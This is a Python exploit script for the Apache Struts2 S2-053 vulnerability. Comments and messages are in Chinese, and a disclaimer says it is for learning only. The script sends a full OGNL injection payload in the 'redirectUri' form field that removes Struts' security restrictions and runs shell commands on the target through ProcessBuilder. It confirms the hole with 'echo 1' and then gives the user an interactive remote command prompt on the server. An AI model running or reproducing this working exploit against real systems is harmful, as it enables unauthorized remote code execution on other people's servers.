#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# @author JourWon
# @date 2021/4/8
# @file S2-053-EXP.py.py
"""
声明：只支持程序学习，请勿非法测试，一切责任与作者无关！
S2-053-EXP.py
使用方法：Python3 S2-053-EXP.py http://target/target.action
author: Anxin 2021/4/8
"""
import sys
import requests
import re

def attract(url, cmd):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    part1 = r"%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"
    part2 = r"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
    exp = part1 + cmd + part2 + "\n"
    data = {"redirectUri": exp}
    res = requests.post(url, data=data, headers=headers)
    if res.status_code == 200:
        result = re.search(r'<p>Your url: ((.*?\s*?)*?)</p>', res.text)
        return result[1].strip()
    else:
        print("出现错误，状态码：" + res.status_code)
        exit()


def main():
    if len(sys.argv) < 2:
        print("Simple: S2-053-EXP.py http://xxxxx/xxx.action")
        exit()
    url = sys.argv[1]
    if attract(url,"echo 1") == '1':
        print("Success!网站存在S2-053漏洞，请输入命令执行(exit退出！)")
    else:
        print("Fail！命令执行失败，请手工确认是否存在漏洞！")
    while True:
        cmd = input("cmd>>>")
        if cmd != 'exit':
            print(attract(url, cmd))
        else:
            exit()


if __name__ == '__main__':
    main()
